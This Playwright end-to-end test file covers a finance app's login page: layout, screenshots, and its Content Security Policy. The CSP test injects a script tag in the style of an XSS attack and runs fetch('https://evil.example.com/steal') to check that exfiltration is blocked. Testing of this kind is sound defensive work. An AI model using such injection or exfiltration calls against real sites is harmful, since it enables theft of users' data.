import { expect, test } from '@playwright/test';
import { createState, installMock } from './mockSupabase';

test('tela de entrada apresenta o app e mantém o formulário à mão', async ({ page }) => {
  await installMock(page, createState());
  await page.goto('/entrar');
  await expect(page.getByRole('heading', { name: 'Entrar', level: 1 })).toBeVisible();
  await expect(page.getByText(/piloto automático/).first()).toBeVisible();
  await expect(page.getByLabel('E-mail')).toBeInViewport();
  await expect(page.getByRole('list', { name: 'Recursos' }).getByText('Previsão do saldo')).toBeAttached();
  const name = test.info().project.name;
  await page.screenshot({ path: `e2e-screens/entrada-${name}-claro.png`, fullPage: true });
  await page.emulateMedia({ colorScheme: 'dark' });
  await page.screenshot({ path: `e2e-screens/entrada-${name}-escuro.png`, fullPage: true });
});

test('política de segurança: bloqueia código injetado e conexões a outros servidores', async ({ page }) => {
  await installMock(page, createState());
  await page.goto('/entrar');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain("object-src 'none'");
  // scripts injetados não rodam; fetch para um servidor estranho é barrado
  const result = await page.evaluate(async () => {
    // script injetado na página (como num ataque XSS) não pode rodar
    const tag = document.createElement('script');
    tag.textContent = 'window.__invadido = true';
    document.body.appendChild(tag);
    await new Promise((r) => setTimeout(r, 50));
    const evalBlocked = !(window as unknown as { __invadido?: boolean }).__invadido;
    let fetchBlocked = false;
    try {
      await fetch('https://evil.example.com/steal');
    } catch {
      fetchBlocked = true;
    }
    return { evalBlocked, fetchBlocked };
  });
  expect(result).toEqual({ evalBlocked: true, fetchBlocked: true });
});
